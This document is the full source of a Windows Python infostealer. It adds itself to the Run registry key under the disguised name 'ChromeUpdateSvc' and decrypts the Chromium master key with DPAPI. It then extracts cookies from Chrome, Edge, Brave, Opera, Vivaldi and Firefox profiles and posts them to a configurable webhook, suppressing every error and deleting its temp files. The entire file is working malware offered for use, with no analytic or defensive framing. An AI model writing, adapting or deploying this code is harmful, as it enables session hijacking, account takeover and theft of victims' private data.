import base64
import json
import os
import shutil
import socket
import sqlite3
import sys
from pathlib import Path
import requests
import win32crypt
from Crypto.Cipher import AES

COOKIE_WEBHOOK = "YOUR_BROWSER_COOKIE_WEBHOOK_HERE"
RUN_KEY_NAME = "ChromeUpdateSvc"

def hostname():
    return socket.gethostname().lower()

def persist():
    if os.name != "nt":
        return
    try:
        import winreg
        exe_dir = os.path.dirname(sys.executable)
        pyw = os.path.join(exe_dir, "pythonw.exe")
        if not os.path.exists(pyw):
            pyw = sys.executable
        script = os.path.abspath(__file__)
        cmd = f'"{pyw}" "{script}"'
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
    except Exception:
        pass

def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except Exception:
            return ""

def steal_chromium(browser_name, user_data_path, output_file):
    local_state = os.path.join(user_data_path, "Local State")
    if not os.path.exists(local_state):
        return
    master_key = get_master_key(local_state)
    if not master_key:
        return
    for profile in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
        db = os.path.join(user_data_path, profile, "Network", "Cookies")
        if not os.path.exists(db):
            db = os.path.join(user_data_path, profile, "Cookies")
        if not os.path.exists(db):
            continue
        tmp = os.path.join(os.environ["TEMP"], "cookies_tmp.db")
        try:
            shutil.copy2(db, tmp)
        except Exception:
            continue
        try:
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
            with open(output_file, "a", encoding="utf-8") as f:
                for host, name, enc in cur.fetchall():
                    if enc:
                        val = decrypt_val(enc, master_key)
                        if val:
                            f.write(f"[{browser_name} - {profile}] {host}\t{name}\t{val}\n")
            conn.close()
            os.remove(tmp)
        except Exception:
            pass

def steal_firefox(output_file):
    appdata = os.environ.get("APPDATA")
    if not appdata:
        return
    ff = Path(appdata) / "Mozilla" / "Firefox" / "Profiles"
    if not ff.exists():
        return
    for profile in ff.iterdir():
        if not profile.is_dir():
            continue
        db = profile / "cookies.sqlite"
        if not db.exists():
            continue
        tmp = os.path.join(os.environ["TEMP"], "ff_cookies_tmp.db")
        try:
            shutil.copy2(db, tmp)
        except Exception:
            continue
        try:
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            cur.execute("SELECT host, name, value FROM moz_cookies")
            with open(output_file, "a", encoding="utf-8") as f:
                for host, name, value in cur.fetchall():
                    f.write(f"[Firefox - {profile.name}] {host}\t{name}\t{value}\n")
            conn.close()
            os.remove(tmp)
        except Exception:
            pass

def grab_cookies():
    local = os.environ.get("LOCALAPPDATA")
    if not local:
        return None
    out = os.path.join(os.environ["TEMP"], f"cookies_{hostname()}.txt")
    if os.path.exists(out):
        os.remove(out)
    browsers = {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera": os.path.join(local, "Programs", "Opera"),
        "Vivaldi": os.path.join(local, "Vivaldi", "User Data"),
    }
    for name, path in browsers.items():
        if os.path.exists(path):
            steal_chromium(name, path, out)
    steal_firefox(out)
    if not os.path.exists(out) or os.path.getsize(out) == 0:
        return None
    with open(out, "rb") as f:
        data = f.read()
    try:
        os.remove(out)
    except Exception:
        pass
    return data

def main():
    persist()
    data = grab_cookies()
    if not data:
        return
    try:
        requests.post(COOKIE_WEBHOOK, files={"file": (f"cookies_{hostname()}.txt", data)}, timeout=30)
    except Exception:
        pass

if __name__ == "__main__":
    main()
